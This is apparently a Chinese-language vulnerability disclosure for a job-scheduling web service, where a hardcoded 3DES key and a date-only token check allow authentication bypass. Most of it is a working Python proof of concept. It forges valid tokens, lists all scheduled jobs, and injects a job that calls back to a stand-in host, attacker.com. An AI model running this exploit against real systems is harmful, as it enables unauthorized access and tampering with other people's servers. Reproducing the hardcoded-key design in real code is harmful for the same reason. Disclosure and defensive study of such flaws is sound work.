系统使用 3DES 加密生成认证 Token，但密钥硬编码在代码中：

private static readonly string des3key = ConfigurationManager.GetTryConfig("DES3Key", "73495773n~@^v&B6");
认证逻辑仅验证 Token 解密后的日期是否为当天：

var time = token.DES3Decrypt().ToDateTime();
if (DateTime.Now.Date == time.Date)
    return Task.CompletedTask;
PoC (Python)
#!/usr/bin/env python3
import base64
import requests
from Crypto.Cipher import DES3
from datetime import datetime
import json

# 硬编码的 3DES 密钥
KEY = b'73495773n~@^v&B6'  # 16 bytes
# 构造 24 bytes 密钥 (与 C# 代码逻辑一致)
FULL_KEY = KEY + KEY[:8]  # 16 + 8 = 24 bytes

def generate_token(target_date=None):
    """伪造有效的认证 Token"""
    if target_date is None:
        target_date = datetime.now()
    
    # Token 内容就是日期字符串
    date_str = target_date.strftime("%Y/%m/%d %H:%M:%S")
    plaintext = date_str.encode('utf-8')
    
    # PKCS7 Padding
    block_size = 8
    padding_len = block_size - (len(plaintext) % block_size)
    padded_plaintext = plaintext + bytes([padding_len] * padding_len)
    
    # 3DES-ECB 加密
    cipher = DES3.new(FULL_KEY, DES3.MODE_ECB)
    ciphertext = cipher.encrypt(padded_plaintext)
    
    # Base64 编码
    token = base64.b64encode(ciphertext).decode('utf-8')
    return token

# 示例使用
if __name__ == "__main__":
    target_url = "http://target:5088"  # 替换为目标地址
    
    # 生成伪造 Token
    fake_token = generate_token()
    print(f"[+] Forged Token: {fake_token}")
    
    # 使用伪造 Token 访问受保护接口
    headers = {"token": fake_token, "Content-Type": "application/json"}
    
    # 测试获取所有任务
    resp = requests.get(f"{target_url}/api/Job/GetAllJob", headers=headers)
    print(f"[+] GetAllJob Response: {resp.status_code}")
    print(f"[+] Response Body: {resp.text[:500]}")
    
    # 测试添加恶意任务
    payload = {
        "JobName": "poc-test",
        "JobGroup": "default",
        "JobType": 1,
        "BeginTime": "2026-03-11T12:00:00",
        "TriggerType": 0,
        "IntervalSecond": 3600,
        "RequestUrl": "http://attacker.com/callback",
        "RequestType": 1
    }
    resp = requests.post(f"{target_url}/api/Job/AddJob", headers=headers, json=payload)
    print(f"[+] AddJob Response: {resp.status_code} - {resp.text}")
